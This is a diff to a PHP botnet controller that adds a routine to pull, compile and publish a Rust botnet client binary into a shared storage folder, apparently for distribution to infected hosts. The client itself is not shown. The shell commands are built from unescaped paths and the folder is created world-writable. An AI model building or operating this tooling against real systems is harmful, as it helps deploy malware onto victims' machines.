@@ -81,5 +81,56 @@ class BotnetController extends Controller
         return redirect('/home')->with('output', "Serveur stoppé.");
     }
 
+    public function botnet_update()
+    {
+        $path = env('PATH_RUST_CLIENT_EXECUTABLE');
+
+        if (!$path) {
+            return redirect('/home')->with('error', 'Path to Rust client executable not set.');
+        }
+
+        $result = [];
+
+        $fullpath = $path . 'PA-BOTNET-CLIENT-v2/';
+
+        $command = "cd $fullpath && git pull";
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'Git pull command failed.');
+        }
+        $result = array_merge($result, ['Success','Client mis a jour avec le repo git']);
+
+
+
+
+        $command = "cd $fullpath && RUSTFLAGS='--cfg client_os=\"linux\"' cargo build --release";
+        exec($command, $output, $return);
+        if ($return !== 0) {
+            return redirect('/home')->with('error', 'Cargo build command failed.');
+        }
+        $result = array_merge($result, ['Success','Client compilé avec cargo build --release']);
+
+
+        if (!is_dir(storage_path('BOTNET-SHARE'))) {
+            mkdir(storage_path('BOTNET-SHARE'), 0777, true);
+        }
+
+        $compiledFilePath = $fullpath . 'target/release/PA-BOTNET-CLIENT-v2';
+        $storagePath = storage_path('BOTNET-SHARE/PA-BOTNET-CLIENT');
+
+
+        if (!copy($compiledFilePath, $storagePath)) {
+            return redirect('/home')->with('error', 'Failed to copy compiled file to storage.');
+        }
+        $result = array_merge($result,['Success','API access mis a jour']);
+
+
+        // Retourne avec les résultats
+        return redirect('/home')->with('output', $result);
+    }
+
+
+
+
 
 }
